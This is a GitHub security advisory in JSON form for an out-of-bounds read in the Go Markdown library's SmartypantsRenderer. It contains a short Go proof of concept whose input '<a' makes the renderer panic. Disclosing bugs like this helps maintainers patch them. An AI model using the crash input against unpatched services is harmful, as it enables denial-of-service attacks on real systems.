{"credits": [{"type": "reporter", "user": {"avatar_url": "https://avatars.githubusercontent.com/u/14008484?v=4", "events_url": "https://api.github.com/users/JulesDT/events{/privacy}", "followers_url": "https://api.github.com/users/JulesDT/followers", "following_url": "https://api.github.com/users/JulesDT/following{/other_user}", "gists_url": "https://api.github.com/users/JulesDT/gists{/gist_id}", "gravatar_id": "", "html_url": "https://github.com/JulesDT", "id": 14008484, "login": "JulesDT", "node_id": "MDQ6VXNlcjE0MDA4NDg0", "organizations_url": "https://api.github.com/users/JulesDT/orgs", "received_events_url": "https://api.github.com/users/JulesDT/received_events", "repos_url": "https://api.github.com/users/JulesDT/repos", "site_admin": false, "starred_url": "https://api.github.com/users/JulesDT/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/JulesDT/subscriptions", "type": "User", "url": "https://api.github.com/users/JulesDT", "user_view_type": "public"}}], "cve_id": "CVE-2026-40890", "cvss": {"score": 7.5, "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}, "cvss_severities": {"cvss_v3": {"score": 7.5, "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}, "cvss_v4": {"score": 0.0, "vector_string": null}}, "cwes": [{"cwe_id": "CWE-125", "name": "Out-of-bounds Read"}], "description": "### Summary

Processing a malformed input containing a `<` character that is not followed by a `>` character anywhere in the remaining text with a SmartypantsRenderer will lead to Out of Bounds read or a panic.

### Details

The `smartLeftAngle()` function in `html/smartypants.go:367-376` performs an out-of-bounds slice operation when processing a `<` character that is not followed by a `>` character anywhere in the remaining text.
https://github.com/gomarkdown/markdown/blob/37c66b85d6ab025ba67a73ba03b7f3ef55859cca/html/smartypants.go#L367-L376
If the length of the slice is lower than its capacity, this leads to an extra byte of data read. If the length equals the capacity, this leads to a panic.

### PoC
```golang
package main

import (
	"bytes"
	"fmt"

	"github.com/gomarkdown/markdown/html"
)

func main() {
	src := []byte("<a")

	fmt.Printf("Input: %q  (len=%d, cap=%d)\n", src, len(src), cap(src))

	var buf bytes.Buffer
	sp := html.NewSmartypantsRenderer(html.Smartypants)
	sp.Process(&buf, src) // panics: slice bounds out of range

	fmt.Printf("Output: %q\n", buf.String())
}
```

### Impact
This vulnerability will lead to a Denial of Service / panic on the processing service.


-- The Datadog Security Team", "epss": {"percentage": 0.00346, "percentile": 0.26521}, "ghsa_id": "GHSA-77fj-vx54-gvh7", "github_reviewed_at": "2026-04-14T22:38:20Z", "html_url": "https://github.com/advisories/GHSA-77fj-vx54-gvh7", "identifiers": [{"type": "GHSA", "value": "GHSA-77fj-vx54-gvh7"}, {"type": "CVE", "value": "CVE-2026-40890"}], "nvd_published_at": "2026-04-21T20:17:02Z", "published_at": "2026-04-14T22:38:20Z", "references": ["https://github.com/gomarkdown/markdown/security/advisories/GHSA-77fj-vx54-gvh7", "https://github.com/gomarkdown/markdown/commit/759bbc3e32073c3bc4e25969c132fc520eda2778", "https://nvd.nist.gov/vuln/detail/CVE-2026-40890", "https://github.com/advisories/GHSA-77fj-vx54-gvh7"], "repository_advisory_url": "https://api.github.com/repos/gomarkdown/markdown/security-advisories/GHSA-77fj-vx54-gvh7", "severity": "high", "source_code_location": "https://github.com/gomarkdown/markdown", "summary": "Go Markdown has an Out-of-bounds Read in SmartypantsRenderer", "type": "reviewed", "updated_at": "2026-04-27T16:17:23Z", "url": "https://api.github.com/advisories/GHSA-77fj-vx54-gvh7", "vulnerabilities": [{"first_patched_version": "0.0.0-20260411013819-759bbc3e3207", "package": {"ecosystem": "go", "name": "github.com/gomarkdown/markdown"}, "vulnerable_functions": [], "vulnerable_version_range": "< 0.0.0-20260411013819-759bbc3e3207"}], "withdrawn_at": null}

title: Go Markdown has an Out-of-bounds Read in SmartypantsRenderer
